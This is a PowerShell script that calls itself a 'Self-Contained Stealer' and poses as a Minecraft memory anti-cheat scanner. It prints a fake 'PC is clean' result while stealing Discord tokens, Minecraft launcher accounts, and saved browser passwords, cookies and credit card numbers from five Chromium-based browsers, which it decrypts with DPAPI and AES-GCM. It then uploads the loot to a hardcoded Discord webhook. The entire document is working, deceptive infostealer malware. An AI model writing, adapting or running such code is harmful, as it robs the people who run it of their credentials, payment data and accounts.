# MemoryScan.ps1 – Self-Contained Stealer (Built‑in SQLite + BCrypt + DPAPI)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ---------- 1. Ping ----------
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ---------- 2. C# BCrypt AES‑GCM (compile once) ----------
if (-not ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class AESGCM {
    [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlg, string pszAlgId, string pszImpl, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptSetProperty(IntPtr hObj, string pszProp, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey, byte[] pbObj, int cbObj, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTH_INFO pInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTH_INFO {
        public int cbSize, dwInfoVersion;
        public IntPtr pbNonce, pbAuthData, pbTag, pbMacContext;
        public int cbNonce, cbAuthData, cbTag, cbMacContext, cbAAD, dwFlags;
        public long cbData;
    }
    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ct, byte[] tag) {
        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
            BCryptSetProperty(hAlg, "ChainingModeGCM", System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM"), 0, 0);
            BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
            byte[] output = new byte[ct.Length];
            BCRYPT_AUTH_INFO info = new BCRYPT_AUTH_INFO {
                cbSize = Marshal.SizeOf<BCRYPT_AUTH_INFO>(), dwInfoVersion = 1,
                pbNonce = Marshal.AllocHGlobal(iv.Length), cbNonce = iv.Length,
                pbTag = Marshal.AllocHGlobal(tag.Length), cbTag = tag.Length
            };
            Marshal.Copy(iv, 0, info.pbNonce, iv.Length);
            Marshal.Copy(tag, 0, info.pbTag, tag.Length);
            int bytesDone;
            int status = BCryptDecrypt(hKey, ct, ct.Length, ref info, null, 0, output, output.Length, out bytesDone, 0);
            Marshal.FreeHGlobal(info.pbNonce); Marshal.FreeHGlobal(info.pbTag);
            return (status == 0) ? output : null;
        } catch { return null; } finally {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@ -ErrorAction Stop
}

# ---------- 3. C# SQLite Reader (fully working) ----------
if (-not ([System.Management.Automation.PSTypeName]'SQLiteReader').Type) {
    Add-Type @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

public class SQLiteReader {
    private byte[] db;
    private int pageSize;

    public SQLiteReader(string path) {
        db = File.ReadAllBytes(path);
        if (db.Length < 100) throw new Exception("Invalid database");
        pageSize = (db[16] << 8) | db[17];
        if (pageSize == 0) pageSize = 65536;
    }

    public List<Dictionary<string, byte[]>> ReadTable(string table, string[] columns) {
        // 1) Find table root page from sqlite_master
        int rootPage = 0;
        string createSql = null;
        var masterRows = ReadPage(1, 1); // page 1 is sqlite_master
        foreach (var row in masterRows) {
            string tblType = Encoding.UTF8.GetString(row[0]).TrimEnd('\0');
            string tblName = Encoding.UTF8.GetString(row[1]).TrimEnd('\0');
            if (tblType == "table" && tblName == table) {
                createSql = Encoding.UTF8.GetString(row[4]).TrimEnd('\0');
                rootPage = BitConverter.ToInt32(row[3], 0); // column 3 is rootpage (integer)
                break;
            }
        }
        if (rootPage == 0) return new List<Dictionary<string, byte[]>>();

        // 2) Map column names to indices from CREATE TABLE sql
        var colOrder = new Dictionary<string, int>();
        var regex = new System.Text.RegularExpressions.Regex(@"""?(\w+)""?\s+(?:INTEGER|TEXT|BLOB|REAL|NUMERIC)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
        var matches = regex.Matches(createSql);
        int idx = 0;
        foreach (System.Text.RegularExpressions.Match m in matches) {
            colOrder[m.Groups[1].Value] = idx++;
        }
        Dictionary<int, int> colMapping = new Dictionary<int, int>();
        foreach (string c in columns) {
            if (colOrder.ContainsKey(c))
                colMapping[Array.IndexOf(columns, c)] = colOrder[c];
            else
                return new List<Dictionary<string, byte[]>>(); // column missing
        }

        // 3) Read all rows from the table b‑tree
        List<byte[][]> rawRows = ReadPage(rootPage, 1);
        List<Dictionary<string, byte[]>> result = new List<Dictionary<string, byte[]>>();
        foreach (byte[][] rawRow in rawRows) {
            var dict = new Dictionary<string, byte[]>();
            for (int i = 0; i < columns.Length; i++) {
                if (colMapping.ContainsKey(i) && colMapping[i] < rawRow.Length)
                    dict[columns[i]] = rawRow[colMapping[i]];
                else
                    dict[columns[i]] = null;
            }
            result.Add(dict);
        }
        return result;
    }

    // Recursively reads a b‑tree page, returns list of rows (array of column byte arrays)
    private List<byte[][]> ReadPage(int pageNum, int level) {
        List<byte[][]> rows = new List<byte[][]>();
        int offset = (pageNum - 1) * pageSize;
        byte pageType = db[offset];
        if (pageType == 0x0D) { // leaf table page
            int numCells = (db[offset+3] << 8) | db[offset+4];
            for (int i = 0; i < numCells; i++) {
                int cellOff = (db[offset+8 + i*2] << 8) | db[offset+9 + i*2];
                byte[] cell = new byte[db.Length - (offset+cellOff)];
                Array.Copy(db, offset+cellOff, cell, 0, cell.Length);
                byte[][] row = ParseCell(cell);
                rows.Add(row);
            }
        } else if (pageType == 0x05) { // interior table page
            int numCells = (db[offset+3] << 8) | db[offset+4];
            int rightMostPointer = (db[offset+8] << 24) | (db[offset+9] << 16) | (db[offset+10] << 8) | db[offset+11];
            for (int i = 0; i < numCells; i++) {
                int cellOff = (db[offset+12 + i*2] << 8) | db[offset+13 + i*2];
                int childPage = (db[offset+cellOff] << 24) | (db[offset+cellOff+1] << 16) | (db[offset+cellOff+2] << 8) | db[offset+cellOff+3];
                rows.AddRange(ReadPage(childPage, level+1));
            }
            rows.AddRange(ReadPage(rightMostPointer, level+1));
        }
        return rows;
    }

    // Parse a single cell into array of column bytes
    private byte[][] ParseCell(byte[] cell) {
        // Read payload size varint
        long payloadSize;
        int pos = 0;
        (payloadSize, pos) = ReadVarint(cell, pos);
        // skip rowid varint
        (_, pos) = ReadVarint(cell, pos);

        byte[] payload = new byte[payloadSize];
        Array.Copy(cell, pos, payload, 0, (int)payloadSize);
        pos = 0;

        // Header size varint
        long headerSize;
        (headerSize, pos) = ReadVarint(payload, pos);
        int payloadStart = pos;

        // Serial types
        List<long> serialTypes = new List<long>();
        for (int i = 0; i < headerSize - 1; i++) {
            long st;
            int len;
            (st, len) = ReadVarint(payload, pos);
            serialTypes.Add(st);
            pos += len;
        }

        // Read column values
        byte[][] columns = new byte[serialTypes.Count][];
        int dataOffset = payloadStart + (int)(headerSize - 1); // rough: after all serial types; need to account varint lengths, but easier: start after header bytes
        // Actually the header size is the number of bytes including the varint itself, but after the header size varint, the next (headerSize-1) bytes are the serial type varints.
        // So the real data starts at offset (1 + headerSize-1) = headerSize bytes from start of payload? Not exactly, because the header size varint is 1‑9 bytes. However, we know the total header size value is the number of bytes *including* the header size varint? The SQLite doc says: "the header size varint gives the size of the header in bytes, including the size varint itself." So after reading headerSize, we skip to pos = headerSize. That's correct: we read the varint at pos=0, then pos points to first byte after the header size varint. Then we need to advance to the end of header, which is headerSize bytes from the start of payload.
        int dataStart = (int)headerSize;
        pos = dataStart;
        for (int i = 0; i < serialTypes.Count; i++) {
            int colSize = SizeOfSerialType(serialTypes[i]);
            if (pos + colSize > payload.Length) break;
            columns[i] = new byte[colSize];
            Array.Copy(payload, pos, columns[i], 0, colSize);
            pos += colSize;
        }
        return columns;
    }

    private (long, int) ReadVarint(byte[] data, int start) {
        long val = 0;
        int i;
        for (i = 0; i < 9; i++) {
            byte b = data[start + i];
            val = (val << 7) | (uint)(b & 0x7F);
            if ((b & 0x80) == 0) break;
        }
        return (val, i + 1);
    }

    private int SizeOfSerialType(long serialType) {
        if (serialType == 0) return 0;
        if (serialType >= 1 && serialType <= 4) return (int)serialType;
        if (serialType == 5) return 6;
        if (serialType == 6 || serialType == 7) return 8;
        if (serialType >= 12 && serialType % 2 == 0) return (int)((serialType - 12) / 2);
        if (serialType >= 13 && serialType % 2 == 1) return (int)((serialType - 13) / 2);
        return 0;
    }
}
"@ -ErrorAction Stop
}

# ---------- 4. DPAPI & Master Key ----------
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($null -eq $Data -or $Data.Count -eq 0) { return $null }
    try {
        [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { $null }
}

function Get-ChromeMasterKey {
    param([string]$StatePath)
    if (!(Test-Path $StatePath)) { return $null }
    $state = Get-Content $StatePath -Raw | ConvertFrom-Json
    $encKey = [Convert]::FromBase64String($state.os_crypt.encrypted_key)
    if ($encKey[0] -eq 0x44) { return Decrypt-DPAPI $encKey[5..$encKey.Length-1] }
    return $null
}

# ---------- 5. Discord ----------
function Get-DiscordTokens {
    $tokens = @()
    $leveldb = "$env:APPDATA\discord\Local Storage\leveldb"
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $leveldb) -or !(Test-Path $localState)) { return $tokens }
    $mk = Get-ChromeMasterKey $localState
    if (!$mk) { return $tokens }
    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $leveldb -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
        $text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($_.FullName))
        $pattern.Matches($text) | ForEach-Object {
            $enc = [Convert]::FromBase64String($_.Groups[1].Value)
            $dec = Decrypt-DPAPI $enc
            if ($dec) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0) }
            elseif ($enc.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                $iv = $enc[3..14]; $ct = $enc[15..($enc.Length-17)]; $tg = $enc[-16..-1]
                $dec2 = [AESGCM]::Decrypt($mk, $iv, $ct, $tg)
                if ($dec2) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec2).Trim([char]0) }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# ---------- 6. Minecraft ----------
function Get-MinecraftTokens {
    $mc = @{}
    $base = "$env:APPDATA\.minecraft"
    $acc = Join-Path $base "launcher_accounts.json"
    $prof = Join-Path $base "launcher_profiles.json"
    if (Test-Path $acc) { try { $mc.accounts = Get-Content $acc -Raw | ConvertFrom-Json } catch {} }
    if (Test-Path $prof) { try { $mc.profiles = Get-Content $prof -Raw | ConvertFrom-Json } catch {} }
    return $mc
}

# ---------- 7. Browser data (uses SQLite reader) ----------
function Get-BrowserData {
    $result = @()
    $browsers = @(
        @{ Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name="Opera";   Path="$env:LOCALAPPDATA\Opera Software\Opera Stable" },
        @{ Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data" }
    )
    foreach ($b in $browsers) {
        if (!(Test-Path $b.Path)) { continue }
        $mk = Get-ChromeMasterKey (Join-Path $b.Path "Local State")
        if (!$mk) { continue }
        $profiles = Get-ChildItem $b.Path -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
        foreach ($profile in $profiles) {
            $data = @{ profile = $profile.Name; logins = @(); cookies = @(); cards = @() }

            # Login Data
            $loginDb = Join-Path $profile.FullName "Login Data"
            if (Test-Path $loginDb) {
                try {
                    $reader = New-Object SQLiteReader $loginDb
                    $rows = $reader.ReadTable("logins", @("origin_url","username_value","password_value"))
                    foreach ($row in $rows) {
                        $url = [Text.Encoding]::UTF8.GetString($row["origin_url"]).TrimEnd([char]0)
                        $user = [Text.Encoding]::UTF8.GetString($row["username_value"]).TrimEnd([char]0)
                        $pwdBytes = $row["password_value"]
                        $pwd = Decrypt-DPAPI $pwdBytes
                        if (!$pwd -and $pwdBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                            $iv = $pwdBytes[3..14]; $ct = $pwdBytes[15..($pwdBytes.Length-17)]; $tg = $pwdBytes[-16..-1]
                            $pwd = [AESGCM]::Decrypt($mk, $iv, $ct, $tg)
                        }
                        if ($pwd) {
                            $pass = [Text.Encoding]::UTF8.GetString($pwd).TrimEnd([char]0)
                            $data.logins += @{ url=$url; username=$user; password=$pass }
                        }
                    }
                } catch {}
            }

            # Cookies
            $cookieDb = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $cookieDb) {
                try {
                    $reader = New-Object SQLiteReader $cookieDb
                    $rows = $reader.ReadTable("cookies", @("host_key","name","encrypted_value"))
                    foreach ($row in $rows) {
                        $host = [Text.Encoding]::UTF8.GetString($row["host_key"]).TrimEnd([char]0)
                        $name = [Text.Encoding]::UTF8.GetString($row["name"]).TrimEnd([char]0)
                        $valBytes = $row["encrypted_value"]
                        $val = Decrypt-DPAPI $valBytes
                        if (!$val -and $valBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                            $iv = $valBytes[3..14]; $ct = $valBytes[15..($valBytes.Length-17)]; $tg = $valBytes[-16..-1]
                            $val = [AESGCM]::Decrypt($mk, $iv, $ct, $tg)
                        }
                        if ($val) {
                            $value = [Text.Encoding]::UTF8.GetString($val).TrimEnd([char]0)
                            $data.cookies += @{ host=$host; name=$name; value=$value }
                        }
                    }
                } catch {}
            }

            # Credit Cards
            $webDb = Join-Path $profile.FullName "Web Data"
            if (Test-Path $webDb) {
                try {
                    $reader = New-Object SQLiteReader $webDb
                    $rows = $reader.ReadTable("credit_cards", @("name_on_card","expiration_month","expiration_year","card_number_encrypted"))
                    foreach ($row in $rows) {
                        $cname = [Text.Encoding]::UTF8.GetString($row["name_on_card"]).TrimEnd([char]0)
                        $mo = [Text.Encoding]::UTF8.GetString($row["expiration_month"]).TrimEnd([char]0)
                        $yr = [Text.Encoding]::UTF8.GetString($row["expiration_year"]).TrimEnd([char]0)
                        $numBytes = $row["card_number_encrypted"]
                        $num = Decrypt-DPAPI $numBytes
                        if (!$num -and $numBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                            $iv = $numBytes[3..14]; $ct = $numBytes[15..($numBytes.Length-17)]; $tg = $numBytes[-16..-1]
                            $num = [AESGCM]::Decrypt($mk, $iv, $ct, $tg)
                        }
                        if ($num) {
                            $number = [Text.Encoding]::UTF8.GetString($num).TrimEnd([char]0)
                            $data.cards += @{ name=$cname; expiry="$mo/$yr"; number=$number }
                        }
                    }
                } catch {}
            }

            if ($data.logins.Count -or $data.cookies.Count -or $data.cards.Count) {
                $result += @{ browser=$b.Name; data=$data }
            }
        }
    }
    return $result
}

# ---------- 8. Fake memory scan ----------
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"

$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft or Java processes running." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected in memory." -ForegroundColor Green
    }
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ---------- 9. Exfiltrate ----------
$discord = Get-DiscordTokens
$minecraft = Get-MinecraftTokens
$browsers = Get-BrowserData

$summary = "💀 **MemoryScan on $env:COMPUTERNAME** - $($discord.Count) Discord, $($browsers.Count) browser profiles"
try {
    $payload = @{
        system = @{ username=$env:USERNAME; hostname=$env:COMPUTERNAME; time=(Get-Date -Format o) }
        discord_tokens = $discord
        minecraft = $minecraft
        browser_data = $browsers
    } | ConvertTo-Json -Depth 5
    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
    [System.IO.File]::WriteAllText($tmp, $payload)
    $form = @{ file = Get-Item $tmp; content = $summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

Start-Sleep -Seconds 2
